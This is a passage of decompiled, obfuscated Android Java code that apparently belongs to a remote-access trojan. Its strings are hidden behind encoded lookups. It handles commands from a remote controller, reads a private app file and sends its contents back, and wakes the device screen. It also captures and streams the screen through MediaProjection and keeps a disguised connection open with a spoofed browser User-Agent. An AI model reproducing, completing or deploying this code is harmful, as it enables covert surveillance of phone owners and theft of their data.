        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("0036007F0059008B00FF00BC00D9009800300062005A009300E500AC"))) {
            JSONObject jSONObject11 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("002000790056008A00F100B100D60098003100730048009200FC00AB", jSONObject11, TypefaceCache.obtain("0037006F004B0082"), "00220075004F008E00FF00B1", strOptString);
            jSONObject11.put(TypefaceCache.obtain("003000630058008400F500AC00C1"), true);
            String strObtain2 = TypefaceCache.obtain("003100730048009200FC00AB");
            DataQFAdapter.Companion.getClass();
            jSONObject11.put(strObtain2, GARjgaGEpTotOxcl8vfe.MLSIo1htfMPWeB8V876L());
            H9XlUr4OeMJFiXK(jSONObject11);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("00240073004F00B800F400BD00D50098002F0079005C"))) {
            try {
                File file = new File(this.dDIMxZXP1V8HdM.getFilesDir(), TypefaceCache.obtain("00270074005C00C900E400A700C6"));
                String strOYRwk007Mtyi = file.exists() ? KgSM0TsKUpCiuePB.OYRwk007Mtyi(u4HKFgCbgUKtEQ.vIJudZvPyTuNp(file), 4000) : TypefaceCache.obtain("006B00730056009700E400A6009B");
                JSONObject jSONObject12 = new JSONObject();
                jSONObject12.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002700730059009200F7008000DE00A80024"));
                jSONObject12.put(TypefaceCache.obtain("002E00730048009400F100B800D7"), strOYRwk007Mtyi);
                H9XlUr4OeMJFiXK(jSONObject12);
                return;
            } catch (Exception e2) {
                JSONObject jSONObject13 = new JSONObject();
                jSONObject13.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002700730059009200F7008000DE00A80024", jSONObject13, TypefaceCache.obtain("0037006F004B0082"), "002E00730048009400F100B800D7"), TypefaceCache.obtain("000600640049008800E200E50092") + e2.getMessage());
                H9XlUr4OeMJFiXK(jSONObject13);
                return;
            }
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("00280073005E009700CF00AC00D100B500260073005500B800FF00B1"))) {
            this.YIgR6F2ZXmLx2ul = jSONObject.optBoolean(TypefaceCache.obtain("00260078005A008500FC00BA00D6"), !this.YIgR6F2ZXmLx2ul);
            TypefaceCache.obtain("00280073005E009700C300BC00C000A2002600780074008900B000E20092");
            JSONObject jSONObject14 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("00280073005E009700CF00AC00D100B500260073005500B800FF00B1", jSONObject14, Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002000790056008A00F100B100D60098003100730048009200FC00AB", jSONObject14, TypefaceCache.obtain("0037006F004B0082"), "00220075004F008E00FF00B1"), "003000630058008400F500AC00C1", true);
            jSONObject14.put(TypefaceCache.obtain("00260078005A008500FC00BA00D6"), this.YIgR6F2ZXmLx2ul);
            H9XlUr4OeMJFiXK(jSONObject14);
            if (!this.YIgR6F2ZXmLx2ul || ((PowerManager) this.dDIMxZXP1V8HdM.getSystemService("power")).isInteractive()) {
                return;
            }
            DataQFAdapter.Companion.getClass();
            DataQFAdapter dataQFAdapter2 = DataQFAdapter.instance;
            if (dataQFAdapter2 != null) {
                dataQFAdapter2.performWakeScreen();
                return;
            }
            return;
        }
        if (strOptString.startsWith(TypefaceCache.obtain("002B00600055008400CF"))) {
            this.J0zjQ7CAgohuxU20eCW6.execute(new FzyGTx12CsdmFylK90AU(strOptString, jSONObject, this, i2));
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(jSONObject.optString(TypefaceCache.obtain("0027007F0048009700FC00BE00CB"), TypefaceCache.obtain("00310073005A008B")), TypefaceCache.obtain("002B007F005F008300F500B1"))) {
            this.J0zjQ7CAgohuxU20eCW6.execute(new FzyGTx12CsdmFylK90AU(strOptString, jSONObject, this, i5));
            return;
        }
        boolean zXiR1pIn5878vVWd = DataQFAdapter.Companion.XiR1pIn5878vVWd(jSONObject);
        JSONObject jSONObject15 = new JSONObject();
        Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("002000790056008A00F100B100D60098003100730048009200FC00AB", jSONObject15, TypefaceCache.obtain("0037006F004B0082"), "00220075004F008E00FF00B1", strOptString);
        jSONObject15.put(TypefaceCache.obtain("003000630058008400F500AC00C1"), zXiR1pIn5878vVWd);
        H9XlUr4OeMJFiXK(jSONObject15);
        if (Aqh0grSwgDbwr.yTljMGnIibTRdOpSh4(TypefaceCache.obtain("003400770050008200CF00AC00D100B5002600730055"), TypefaceCache.obtain("003000750049008200F500B100ED00A8002D"), TypefaceCache.obtain("003000750049008200F500B100ED00A800250070"), TypefaceCache.obtain("002F00790058008C00CF00AC00D100B5002600730055")).contains(strOptString)) {
            this.nQilHWaqS401ZtR.postDelayed(new uY2iPU7ne5s7Y5LeXnLI(this, 93 - 78), 500L);
        }
    }

    public final void iUQk66nAiXgO35(int i) {
        if (this.XiR1pIn5878vVWd) {
            return;
        }
        this.gmNWMfvn6zlEj = true;
        this.gIIiyi2ddlMDR0 = i;
        TypefaceCache.obtain("00300062005A009500E4008C00C600B5002600770056008E00FE00B8009200B6003600770057008E00E400A6008F");
        b1EoSIRjJHO5();
        ManagerUMController.XuO9PPFo607ssKwZjNW = i;
        this.J0zjQ7CAgohuxU20eCW6.execute(new eY3e7LNeKcWCerE2VMV(this, i, 0));
    }

    public final void ibVTtJUNfrGYbW(String str) {
        this.b1EoSIRjJHO5 = str;
        this.ibVTtJUNfrGYbW = true;
        TypefaceCache.obtain("000000790055008900F500BC00C600AE002D0071001B009300FF00FF");
        J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC = this.vekpFI4d1Nc4fakF;
        if (j1m0XraSkScfWFMIlTC != null) {
            try {
                j1m0XraSkScfWFMIlTC.w9sT1Swbhx3hs(TypefaceCache.obtain("003100730058008800FE00B100D700A40037"), 1000);
            } catch (Exception unused) {
            }
        }
        ThreadLocalRandom threadLocalRandomCurrent = ThreadLocalRandom.current();
        Vb7X6LE0p9sZh vb7X6LE0p9sZhDDIMxZXP1V8HdM = ((sp6apkX00TawY02qGY6r) PKzJf7Iq6ie0OaUSZLp.dDIMxZXP1V8HdM()).dDIMxZXP1V8HdM();
        long jNextInt = threadLocalRandomCurrent.nextInt(18) + 18;
        TimeUnit timeUnit = TimeUnit.SECONDS;
        vb7X6LE0p9sZhDDIMxZXP1V8HdM.EWUjsTERgdPbSw3NNlN = yrMnf4fyLGfIJbMg8IbG.w9sT1Swbhx3hs("interval", jNextInt, timeUnit);
        vb7X6LE0p9sZhDDIMxZXP1V8HdM.l1V0lQr6TbwNKqHfXNbb = yrMnf4fyLGfIJbMg8IbG.w9sT1Swbhx3hs("timeout", threadLocalRandomCurrent.nextInt(9) + 12, timeUnit);
        vb7X6LE0p9sZhDDIMxZXP1V8HdM.dTS0S7eC32ubQH54j36 = yrMnf4fyLGfIJbMg8IbG.w9sT1Swbhx3hs("timeout", threadLocalRandomCurrent.nextInt(9) + 12, timeUnit);
        vb7X6LE0p9sZhDDIMxZXP1V8HdM.K7eEOBPYP9VIoHWTe = yrMnf4fyLGfIJbMg8IbG.w9sT1Swbhx3hs("timeout", 0L, TimeUnit.MILLISECONDS);
        sp6apkX00TawY02qGY6r sp6apkx00tawy02qgy6r = new sp6apkX00TawY02qGY6r(vb7X6LE0p9sZhDDIMxZXP1V8HdM);
        String[] strArr = UE6365QWSHVg5Fff;
        String str2 = strArr[threadLocalRandomCurrent.nextInt(strArr.length)];
        String[] strArr2 = uV1d27nePzvpefeE;
        String str3 = strArr2[threadLocalRandomCurrent.nextInt(strArr2.length)];
        fUH025aw0Rgl fuh025aw0rgl = new fUH025aw0Rgl(2);
        fuh025aw0rgl.D5P1xCAyuvgF(str);
        String strObtain = TypefaceCache.obtain("00160065005E009500BD009E00D500A2002D0062");
        String strObtain2 = TypefaceCache.obtain("000E00790041008E00FC00B300D300E800760038000B00C700B8009300DB00A90036006E000000C700D100B100D600B5002C007F005F00C7");
        String str4 = Build.VERSION.RELEASE;
        String str5 = Build.MODEL;
        String strObtain3 = TypefaceCache.obtain("006A0036007A009700E000B300D70090002600740070008E00E400F0008700F400740038000800D100B000F700F9008F0017005B007700CB00B000B300DB00AC00260036007C008200F300B400DD00EE006300550053009500FF00B200D700E8");
        String strObtain4 = TypefaceCache.obtain("0063005B0054008500F900B300D700E700100077005D008600E200B6009D00F200700021001500D400A6");
        StringBuilder sb = new StringBuilder();
        sb.append(strObtain2);
        sb.append(str4);
        sb.append("; ");
        sb.append(str5);
        sb.append(strObtain3);
        ((r5XEUfod5GSCCwq6c) fuh025aw0rgl.vekpFI4d1Nc4fakF).yTljMGnIibTRdOpSh4(strObtain, Y9mRyRdkl5FOcwb66V6.D5P1xCAyuvgF(sb, str2, strObtain4));
        ((r5XEUfod5GSCCwq6c) fuh025aw0rgl.vekpFI4d1Nc4fakF).yTljMGnIibTRdOpSh4(TypefaceCache.obtain("000200750058008200E000AB009F008B00220078005C009200F100B800D7"), str3);
        ((r5XEUfod5GSCCwq6c) fuh025aw0rgl.vekpFI4d1Nc4fakF).yTljMGnIibTRdOpSh4(TypefaceCache.obtain("000000770058008F00F500F200F100A8002D00620049008800FC"), TypefaceCache.obtain("002D00790016008400F100BC00DA00A2"));
        ((r5XEUfod5GSCCwq6c) fuh025aw0rgl.vekpFI4d1Nc4fakF).yTljMGnIibTRdOpSh4(TypefaceCache.obtain("00130064005A008000FD00BE"), TypefaceCache.obtain("002D00790016008400F100BC00DA00A2"));
        this.vekpFI4d1Nc4fakF = sp6apkx00tawy02qgy6r.w9sT1Swbhx3hs(fuh025aw0rgl.dDIMxZXP1V8HdM(), new XxXBSmiig14HgdAKPhi8(str, this));
    }

    public final void k84rwRrqzhrNQ1CdNQ9(boolean z, boolean z2) {
        if (this.XiR1pIn5878vVWd) {
            this.XiR1pIn5878vVWd = false;
            this.H9XlUr4OeMJFiXK.set(0);
            xDyLpEZyrcKVe0();
            Thread thread = this.MLSIo1htfMPWeB8V876L;
            if (thread != null) {
                thread.interrupt();
            }
            this.MLSIo1htfMPWeB8V876L = null;
            PowerManager.WakeLock wakeLock = this.JW3Lh9hxwLsO2ArTlH;
            if (wakeLock != null && wakeLock.isHeld()) {
                PowerManager.WakeLock wakeLock2 = this.JW3Lh9hxwLsO2ArTlH;
                if (wakeLock2 != null) {
                    wakeLock2.release();
                }
                TypefaceCache.obtain("001400770050008200DC00B000D100AC00630064005E008B00F500BE00C100A20027");
            }
            if (z2) {
                this.OYRwk007Mtyi = false;
                Thread thread2 = this.uW0IRoPBZMj2QmBkkp;
                if (thread2 != null) {
                    thread2.interrupt();
                }
                this.uW0IRoPBZMj2QmBkkp = null;
                String str = vatBtnIbOWqS8Z.K7eEOBPYP9VIoHWTe;
                vatBtnIbOWqS8Z vatbtnibowqs8z = vatBtnIbOWqS8Z.dTS0S7eC32ubQH54j36;
                if (vatbtnibowqs8z != null) {
                    vatbtnibowqs8z.pyu8ovAipBTLYAiKab();
                }
            }
            x1G2i7KvSdxo3fp x1g2i7kvsdxo3fp = x1G2i7KvSdxo3fp.gmNWMfvn6zlEj;
            x1G2i7KvSdxo3fp x1g2i7kvsdxo3fp2 = x1G2i7KvSdxo3fp.gmNWMfvn6zlEj;
            if (x1g2i7kvsdxo3fp2 != null) {
                x1g2i7kvsdxo3fp2.JXn4Qf7zpnLjP5();
            }
            DataQFAdapter.Companion.getClass();
            GARjgaGEpTotOxcl8vfe.dQC4QhgRN3MSEAP3HW0();
            if (z) {
                String str2 = ManagerUMController.DVTNwpDEVsUKuznof;
                if (ManagerUMController.ECwLkmPW1UKz7J6E) {
                    this.nQilHWaqS401ZtR.post(new uY2iPU7ne5s7Y5LeXnLI(this, 17));
                }
            }
            boolean z3 = UtilAIWorker.MLSIo1htfMPWeB8V876L;
            if (UtilAIWorker.MLSIo1htfMPWeB8V876L) {
                try {
                    gA5gCwTK0qjTIn.vIJudZvPyTuNp(this.dDIMxZXP1V8HdM);
                } catch (Exception unused) {
                }
                TypefaceCache.obtain("000000770056008200E200BE009200B400370064005E008600FD00FF00C100B3002C0066004B008200F400FF00DD00A900630041006800C700F400B600C100A4002C00780055008200F300AB");
            }
            PHZNFNJs3M6qql pHZNFNJs3M6qql = PHZNFNJs3M6qql.pyu8ovAipBTLYAiKab;
            if (PHZNFNJs3M6qql.D5P1xCAyuvgF) {
                try {
                    okc5AGRjqrud84oM6d.MLSIo1htfMPWeB8V876L();
                } catch (Exception unused2) {
                }
                TypefaceCache.obtain("000E007F005800C700E300AB00C000A20022007B001B009400E400B000C200B700260072001B008800FE00FF00E50094006300720052009400F300B000DC00A900260075004F");
            }
            TypefaceCache.obtain("001000620049008200F100B200DB00A9002400360048009300FF00AF00C200A2002700360013008C00F900B300DE008400220066004F009200E200BA008F");
        }
    }

    public final void l1V0lQr6TbwNKqHfXNbb() {
        try {
            String str = CacheLUJob.Ee8d2j4S9Vm5yGuR;
            JSONObject jSONObjectPyu8ovAipBTLYAiKab = okc5AGRjqrud84oM6d.pyu8ovAipBTLYAiKab();
            if (jSONObjectPyu8ovAipBTLYAiKab != null) {
                H9XlUr4OeMJFiXK(jSONObjectPyu8ovAipBTLYAiKab);
                TypefaceCache.obtain("001100730058008800E200BB00DB00A9002400360048008200FE00AB008800E7");
                jSONObjectPyu8ovAipBTLYAiKab.optInt("size");
                TypefaceCache.obtain("006300740042009300F500AC");
                return;
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("00220063005F008E00FF008000C000A2002000790049008300F900B100D5"));
            jSONObject.put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("000D0079001B009500F500BC00DD00B50027007F0055008000B000BE00C400A6002A007A005A008500FC00BA"));
            H9XlUr4OeMJFiXK(jSONObject);
        } catch (Exception e) {
            TypefaceCache.obtain("003000730055008300C200BA00D100A8003100720052008900F700FF00D700B500310079004900DD00B0");
            e.getMessage();
        }
    }

    public final boolean nQilHWaqS401ZtR(byte[] bArr) {
        try {
            return EWUjsTERgdPbSw3NNlN(fadfsJa4iEdiwEC4Xm8.ibVTtJUNfrGYbW(bArr));
        } catch (Exception e) {
            TypefaceCache.obtain("003000730055008300D200B600DC00A60031006F007F008E00E200BA00D100B3006300730049009500FF00AD008800E7");
            e.getMessage();
            return false;
        }
    }

    public final long pyu8ovAipBTLYAiKab() {
        int i = this.hjneShqpF9Tis4;
        if (i > 4) {
            i = 4;
        }
        long j = (1 << i) * 2000;
        if (j > 30000) {
            j = 30000;
        }
        this.hjneShqpF9Tis4++;
        return j;
    }

    public final boolean qfTrc75xwRVMl85vh(int i) throws JSONException {
        String str = ManagerUMController.DVTNwpDEVsUKuznof;
        if (ManagerUMController.ECwLkmPW1UKz7J6E && ManagerUMController.fivkjwgu2UdAtiY != null) {
            TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E70022007A0049008200F100BB00CB00E7003100630055008900F900B100D500EB00630064005E008100E200BA00C100AF002A0078005C00C700C600B600C000B300360077005700A300F900AC00C200AB0022006F");
            try {
                Context context = this.dDIMxZXP1V8HdM;
                context.startService(SbxdZ6Kq2uhHQ5RPRqm.XiR1pIn5878vVWd(context));
                return true;
            } catch (Exception e) {
                TypefaceCache.obtain("00110073005D009500F500AC00DA00E70015007F0049009300E500BE00DE0083002A0065004B008B00F100A6009200A10022007F0057008200F400E50092");
                e.getMessage();
                return true;
            }
        }
        String str2 = HandlerSJAdapter.dTS0S7eC32ubQH54j36;
        if (jb8et6SZeK5TWMrJFxDX.gmNWMfvn6zlEj() && Build.VERSION.SDK_INT < 34) {
            TypefaceCache.obtain("001600650052008900F700FF00C100B3002C0064005E008300B000AF00C000A8002900730058009300F900B000DC00E700250079004900C700C7009A00F00097");
            try {
                Integer num = HandlerSJAdapter.O2DHNSIGZlgPja7eqLgn;
                if (num != null) {
                    int iIntValue = num.intValue();
                    Intent intent = HandlerSJAdapter.xfn2GJwmGqs7kWW;
                    if (intent != null) {
                        this.dDIMxZXP1V8HdM.startForegroundService(SbxdZ6Kq2uhHQ5RPRqm.H9XlUr4OeMJFiXK(this.dDIMxZXP1V8HdM, iIntValue, intent, i));
                        return MSGkxvPxRYNqC(10000L);
                    }
                }
                return false;
            } catch (Exception e2) {
                TypefaceCache.obtain("001000620054009500F500BB009200B7003100790051008200F300AB00DB00A8002D00360048009300F100AD00C600E7002500770052008B00F500BB008800E7");
                e2.getMessage();
            }
        }
        TypefaceCache.obtain("00110073004A009200F500AC00C600AE002D0071001B00AA00F500BB00DB00A6001300640054008D00F500BC00C600AE002C0078001B009700F500AD00DF00AE003000650052008800FE00FF00D400A800310036006C00A200D2008F");
        JSONObject jSONObject = new JSONObject();
        jSONObject.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("003300640054008D00F500BC00C600AE002C00780064009400E400BE00C600B20030", jSONObject, TypefaceCache.obtain("0037006F004B0082"), "00300062005A009300E500AC"), TypefaceCache.obtain("00310073004A009200F500AC00C600AE002D00710064009700F500AD00DF00AE003000650052008800FE"));
        H9XlUr4OeMJFiXK(jSONObject);
        try {
            VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ5 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
            VpKcDcuRNaQkRJ5.xDyLpEZyrcKVe0 = true;
            String str3 = HandlerSJAdapter.dTS0S7eC32ubQH54j36;
            this.dDIMxZXP1V8HdM.startActivity(jb8et6SZeK5TWMrJFxDX.D5P1xCAyuvgF(this.dDIMxZXP1V8HdM, i));
            return MSGkxvPxRYNqC(15000L);
        } catch (Exception e3) {
            TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E7003300730049008A00F900AC00C100AE002C0078001B009500F500AE00C700A200300062001B008100F100B600DE00A20027002C001B");
            e3.getMessage();
            return false;
        }
    }

    public final boolean rCHnHJBAlOpNI5() {
        String str = vatBtnIbOWqS8Z.K7eEOBPYP9VIoHWTe;
        vatBtnIbOWqS8Z vatbtnibowqs8z = vatBtnIbOWqS8Z.dTS0S7eC32ubQH54j36;
        if (vatbtnibowqs8z != null && vatbtnibowqs8z.ibVTtJUNfrGYbW.get()) {
            vatBtnIbOWqS8Z vatbtnibowqs8z2 = vatBtnIbOWqS8Z.dTS0S7eC32ubQH54j36;
            if (vatbtnibowqs8z2 != null) {
                vatbtnibowqs8z2.D5P1xCAyuvgF = new ubmqYDSfxvxS(this, 1);
            }
            O2DHNSIGZlgPja7eqLgn();
            return true;
        }
        String str2 = ManagerUMController.DVTNwpDEVsUKuznof;
        ManagerUMController managerUMController = ManagerUMController.fivkjwgu2UdAtiY;
        MediaProjection mediaProjection = managerUMController != null ? managerUMController.dDIMxZXP1V8HdM : null;
        boolean z = false;
        if (mediaProjection == null) {
            TypefaceCache.obtain("000D0079001B00AA00F500BB00DB00A6001300640054008D00F500BC00C600AE002C0078001B008600E600BE00DB00AB002200740057008200B000B900DD00B50063005E006D00A900D300FF00DA00AE00270072005E008900B000BB00DB00B40033007A005A009E00BE00FF00E100B300220064004F00C700FD00BE00DB00A900630065004F009500F500BE00DF00E70025007F0049009400E400F1");
            return false;
        }
        Context context = this.dDIMxZXP1V8HdM;
        vatBtnIbOWqS8Z vatbtnibowqs8z3 = new vatBtnIbOWqS8Z(context, mediaProjection);
        this.KV57Z6oavcB595B8Dy8Z = 0;
        int i = vatBtnIbOWqS8Z.yTljMGnIibTRdOpSh4;
        if (vatbtnibowqs8z3.ibVTtJUNfrGYbW.get()) {
            z = true;
        } else {
            try {
                int i2 = ManagerUMController.qfTrc75xwRVMl85vh;
                Integer numValueOf = Integer.valueOf(i2);
                if (i2 <= 0) {
                    numValueOf = null;
                }
                float fIntValue = numValueOf != null ? numValueOf.intValue() : context.getResources().getDisplayMetrics().heightPixels;
                int i3 = ManagerUMController.euF5Udt5Rqv3Qmea;
                Integer numValueOf2 = i3 > 0 ? Integer.valueOf(i3) : null;
                int i4 = i - (i % 2);
                int iIntValue = (int) (i4 * (fIntValue / (numValueOf2 != null ? numValueOf2.intValue() : context.getResources().getDisplayMetrics().widthPixels)));
                int i5 = iIntValue - (iIntValue % 2);
                vatbtnibowqs8z3.gmNWMfvn6zlEj = i4;
                vatbtnibowqs8z3.gIIiyi2ddlMDR0 = i5;
                TypefaceCache.obtain("00300062005A009500E400F7009B00FD006300610006");
                TypefaceCache.obtain("0063007E0006");
                TypefaceCache.obtain("006300770048009700F500BC00C600FA");
                TypefaceCache.obtain("00630072005E008900E300B600C600BE007E");
                int i6 = context.getResources().getDisplayMetrics().densityDpi;
                HandlerThread handlerThread = new HandlerThread(TypefaceCache.obtain("002B00600055008400BD00AD00D700A6002700730049"));
                handlerThread.start();
                vatbtnibowqs8z3.Ee8d2j4S9Vm5yGuR = handlerThread;
                vatbtnibowqs8z3.xDyLpEZyrcKVe0 = new Handler(vatbtnibowqs8z3.Ee8d2j4S9Vm5yGuR.getLooper());
                ImageReader imageReaderNewInstance = ImageReader.newInstance(i4, i5, 1, 3);
                vatbtnibowqs8z3.JXn4Qf7zpnLjP5 = imageReaderNewInstance;
                imageReaderNewInstance.setOnImageAvailableListener(vatbtnibowqs8z3.H9XlUr4OeMJFiXK, vatbtnibowqs8z3.xDyLpEZyrcKVe0);
                VirtualDisplay virtualDisplayHjneShqpF9Tis4 = vatbtnibowqs8z3.hjneShqpF9Tis4(i4, i5);
                vatbtnibowqs8z3.vekpFI4d1Nc4fakF = virtualDisplayHjneShqpF9Tis4;
                if (virtualDisplayHjneShqpF9Tis4 == null) {
                    TypefaceCache.obtain("0002007A005700C700C600B600C000B300360077005700A300F900AC00C200AB0022006F001B008400E200BA00D300B3002A0079005500C700F100AB00C600A2002E0066004F009400B000B900D300AE002F0073005F");
                    vatbtnibowqs8z3.dDIMxZXP1V8HdM();
                } else {
                    Display display = virtualDisplayHjneShqpF9Tis4.getDisplay();
                    vatbtnibowqs8z3.hjneShqpF9Tis4 = display != null ? display.getDisplayId() : -1;
                    vatbtnibowqs8z3.ibVTtJUNfrGYbW.set(true);
                    vatBtnIbOWqS8Z.dTS0S7eC32ubQH54j36 = vatbtnibowqs8z3;
                    TypefaceCache.obtain("00100062005A009500E400BA00D600FD0063");
                    TypefaceCache.obtain("006F0036005F008E00E300AF00DE00A6003A005F005F00DA");
                    TypefaceCache.obtain("006F0036005F008200FE00AC00DB00B3003A002B");
                    int i7 = context.getResources().getDisplayMetrics().densityDpi;
                    vatbtnibowqs8z3.w9sT1Swbhx3hs();
                    vatbtnibowqs8z3.vekpFI4d1Nc4fakF(i4, i5);
                    vatbtnibowqs8z3.wotphlvK9sPbXJ.postDelayed(new bJh2Z6WitLMhtq(vatbtnibowqs8z3, 0), 300L);
                    vatbtnibowqs8z3.wotphlvK9sPbXJ.postDelayed(new bJh2Z6WitLMhtq(vatbtnibowqs8z3, 1), 1500L);
                    z = true;
                }
            } catch (Exception e) {
                TypefaceCache.obtain("00100062005A009500E400FF00D400A6002A007A005E008300AA00FF");
                e.getMessage();
                vatbtnibowqs8z3.dDIMxZXP1V8HdM();
            }
        }
        if (z) {
            String str3 = vatBtnIbOWqS8Z.K7eEOBPYP9VIoHWTe;
            vatBtnIbOWqS8Z vatbtnibowqs8z4 = vatBtnIbOWqS8Z.dTS0S7eC32ubQH54j36;
            if (vatbtnibowqs8z4 != null) {
                vatbtnibowqs8z4.D5P1xCAyuvgF = new ubmqYDSfxvxS(this, 1);
            }
            O2DHNSIGZlgPja7eqLgn();
        }
        return z;
    }

    public final void tne6mXOUFKdd() {
        if (this.XiR1pIn5878vVWd) {
            TypefaceCache.obtain("0002007A0049008200F100BB00CB00E7003000620049008200F100B200DB00A90024003A001B009400FB00B600C200B7002A0078005C00C700E300AB00D300B50037005B005E008300F900BE00E200B5002C007C005E008400E400B600DD00A900050064005A008A00F5009300DD00A80033");
            return;
        }
        this.XiR1pIn5878vVWd = true;
        this.H9XlUr4OeMJFiXK.set(0);
        JXn4Qf7zpnLjP5();
        this.XuO9PPFo607ssKwZjNW = System.currentTimeMillis();
        this.iUQk66nAiXgO35 = 0L;
        String str = ManagerUMController.DVTNwpDEVsUKuznof;
        TypefaceCache.obtain("00100062005A009500E400B600DC00A00063005B005E008300F900BE00E200B5002C007C005E008400E400B600DD00A9006300700049008600FD00BA009200AB002C0079004B00CB00B000BB00D700B1002A0075005E00DA");
        Thread thread = new Thread(new uY2iPU7ne5s7Y5LeXnLI(this, 2), TypefaceCache.obtain("00350078005800CA00F600AD00D300AA0026003B00560097"));
        this.MLSIo1htfMPWeB8V876L = thread;
        thread.setUncaughtExceptionHandler(this.EWUjsTERgdPbSw3NNlN);
        Thread thread2 = this.MLSIo1htfMPWeB8V876L;
        if (thread2 != null) {
            thread2.start();
        }
    }

    public final void vIJudZvPyTuNp(int i) {
        final int iWidth;
        final int iHeight;
        TypefaceCache.obtain("00100062005A009500E400B600DC00A0006300570058008400F500AC00C100AE0021007F0057008E00E400A6009200B1002A0072005E008800B000AC00C600B500260077005600CB00B000AE00C700A6002F007F004F009E00AD");
        DataQFAdapter.Companion.getClass();
        if (DataQFAdapter.instance == null) {
            TypefaceCache.obtain("000200750058008200E300AC00DB00A5002A007A0052009300E900FF00C100A2003100600052008400F500FF00D600A200220072001700C700F300BE00DC00A9002C0062001B009400E400BE00C000B3006300600052008300F500B0009200B400370064005E008600FD");
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002200750058008200E300AC00DB00A5002A007A0052009300E9008000C700A900220060005A008E00FC00BE00D000AB0026", jSONObject, TypefaceCache.obtain("0037006F004B0082"), "00310073005A009400FF00B1"), TypefaceCache.obtain("003000730049009100F900BC00D7009800270073005A0083"));
            H9XlUr4OeMJFiXK(jSONObject);
            return;
        }
        DataQFAdapter.streamQuality = i;
        GARjgaGEpTotOxcl8vfe.is7XW2V21HfKv7MihWy();
        if (this.XiR1pIn5878vVWd) {
            TypefaceCache.obtain("0002007A0049008200F100BB00CB00E7003000620049008200F100B200DB00A90024003A001B009400FB00B600C200B7002A0078005C00C700E300AB00D300B5003700570058008400F500AC00C100AE0021007F0057008E00E400A600F400B50022007B005E00AB00FF00B000C2");
            return;
        }
        this.XiR1pIn5878vVWd = true;
        this.H9XlUr4OeMJFiXK.set(0);
        JXn4Qf7zpnLjP5();
        WindowManager windowManager = (WindowManager) this.dDIMxZXP1V8HdM.getSystemService("window");
        if (Build.VERSION.SDK_INT >= 30) {
            Rect bounds = windowManager.getCurrentWindowMetrics().getBounds();
            iWidth = bounds.width();
            iHeight = bounds.height();
        } else {
            Point point = new Point();
            windowManager.getDefaultDisplay().getRealSize(point);
            int i2 = point.x;
            int i3 = point.y;
            iWidth = i2;
            iHeight = i3;
        }
        final boolean z = DataQFAdapter.useH264;
        TypefaceCache.obtain("00100062005A009500E400B600DC00A000630066004E008B00FC00F200D000A600300073005F00C700F600AD00D300AA002600360057008800FF00AF009200EF002B0024000D00D300AD");
        this.H9XlUr4OeMJFiXK.set(0);
        this.XuO9PPFo607ssKwZjNW = System.currentTimeMillis();
        this.iUQk66nAiXgO35 = 0L;
        Thread thread = new Thread(new Runnable() { // from class: v.s.llRRXlcraB9Mo
            /* JADX WARN: Code duplicated, block: B:36:0x00af A[Catch: Exception -> 0x009b, OutOfMemoryError -> 0x00a0, InterruptedException -> 0x01cd, TryCatch #5 {InterruptedException -> 0x01cd, blocks: (B:7:0x0021, B:9:0x002c, B:11:0x0032, B:13:0x0046, B:19:0x006d, B:22:0x0077, B:26:0x0085, B:28:0x0090, B:32:0x00a3, B:34:0x00ab, B:36:0x00af, B:38:0x00b5, B:44:0x00d7, B:46:0x00e2, B:48:0x00e6, B:52:0x00f4, B:54:0x00fe, B:55:0x0110, B:61:0x0125, B:70:0x018a, B:73:0x0193, B:62:0x012a, B:64:0x0138, B:66:0x016e, B:67:0x0183, B:69:0x0187), top: B:86:0x0021 }] */
            /* JADX WARN: Code duplicated, block: B:38:0x00b5 A[Catch: Exception -> 0x009b, OutOfMemoryError -> 0x00a0, InterruptedException -> 0x01cd, TryCatch #5 {InterruptedException -> 0x01cd, blocks: (B:7:0x0021, B:9:0x002c, B:11:0x0032, B:13:0x0046, B:19:0x006d, B:22:0x0077, B:26:0x0085, B:28:0x0090, B:32:0x00a3, B:34:0x00ab, B:36:0x00af, B:38:0x00b5, B:44:0x00d7, B:46:0x00e2, B:48:0x00e6, B:52:0x00f4, B:54:0x00fe, B:55:0x0110, B:61:0x0125, B:70:0x018a, B:73:0x0193, B:62:0x012a, B:64:0x0138, B:66:0x016e, B:67:0x0183, B:69:0x0187), top: B:86:0x0021 }] */
            /* JADX WARN: Code duplicated, block: B:41:0x00cc  */
            /* JADX WARN: Code duplicated, block: B:44:0x00d7 A[Catch: Exception -> 0x009b, OutOfMemoryError -> 0x00a0, InterruptedException -> 0x01cd, TryCatch #5 {InterruptedException -> 0x01cd, blocks: (B:7:0x0021, B:9:0x002c, B:11:0x0032, B:13:0x0046, B:19:0x006d, B:22:0x0077, B:26:0x0085, B:28:0x0090, B:32:0x00a3, B:34:0x00ab, B:36:0x00af, B:38:0x00b5, B:44:0x00d7, B:46:0x00e2, B:48:0x00e6, B:52:0x00f4, B:54:0x00fe, B:55:0x0110, B:61:0x0125, B:70:0x018a, B:73:0x0193, B:62:0x012a, B:64:0x0138, B:66:0x016e, B:67:0x0183, B:69:0x0187), top: B:86:0x0021 }] */
